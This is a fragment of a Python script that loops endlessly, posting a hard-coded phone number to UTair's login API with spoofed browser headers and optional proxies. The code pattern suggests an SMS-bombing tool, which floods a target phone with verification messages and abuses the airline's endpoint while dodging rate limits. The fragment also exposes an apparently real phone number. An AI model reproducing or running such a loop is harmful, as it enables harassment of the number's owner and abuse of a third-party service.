            ...
            while True:
                try:
                    if proxy == None:
                        ...
                        r = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':'380509647548'}, headers = {'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'b.utair.ru', 'origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'}, proxies={'http': str(proxy), 'https': str(proxy)})
